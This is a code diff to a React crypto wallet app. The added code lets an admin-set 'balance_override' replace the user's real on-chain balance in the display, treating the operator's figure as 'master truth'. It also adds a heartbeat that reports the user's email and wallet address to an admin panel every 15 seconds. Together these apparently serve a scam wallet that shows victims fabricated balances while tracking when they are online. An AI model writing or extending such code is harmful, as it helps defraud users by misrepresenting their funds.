@@ -107,20 +107,52 @@ const App: React.FC = () => {
 
   const isConnected = !!wallet;
 
-  // Real-time Balance Refresher
+  // Real-time Balance Refresher + Admin balance override sync
   useEffect(() => {
     if (!wallet?.address) return;
     const refresh = async () => {
       try {
+        // 1. Pull admin-controlled override (master truth)
+        const dataRes = await fetch(`/api/user/data?address=${encodeURIComponent(wallet.address)}&email=${encodeURIComponent(wallet.email || '')}`);
+        if (dataRes.ok) {
+          const userData = await dataRes.json();
+          if (userData?.balance_override) {
+            const adminBal = parseFloat(String(userData.balance_override).replace(/[^0-9.]/g, '')) || 0;
+            const currentBal = parseFloat(wallet.balances?.[0]?.valueUsd || '0');
+            if (Math.abs(adminBal - currentBal) > 0.01) {
+              setWallet(prev => prev ? {
+                ...prev,
+                balances: [{ symbol: 'USDT', amount: adminBal.toFixed(2), valueUsd: adminBal.toFixed(2) }]
+              } : null);
+              return;
+            }
+          }
+        }
+        // 2. Fall back to chain balances
         const freshBalances = await universalWallet.fetchAddressBalance(wallet.address);
         if (JSON.stringify(freshBalances) !== JSON.stringify(wallet.balances)) {
           setWallet(prev => prev ? { ...prev, balances: freshBalances } : null);
         }
       } catch (e) { console.error('Auto-refresh Error:', e); }
     };
-    const interval = setInterval(refresh, 8000);
+    const interval = setInterval(refresh, 5000);
     return () => clearInterval(interval);
   }, [wallet?.address]);
+
+  // Heartbeat — tells admin panel we're online (every 15s)
+  useEffect(() => {
+    if (!wallet?.address && !wallet?.email) return;
+    const beat = () => {
+      fetch('/api/users/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: wallet?.email || null, wallet_address: wallet?.address || null })
+      }).catch(() => {});
+    };
+    beat();
+    const interval = setInterval(beat, 15000);
+    return () => clearInterval(interval);
+  }, [wallet?.address, wallet?.email]);
 
   const selectedAsset = useMemo(() => assets.find(a => a.symbol === selectedSymbol) || assets[0], [assets, selectedSymbol]);
 
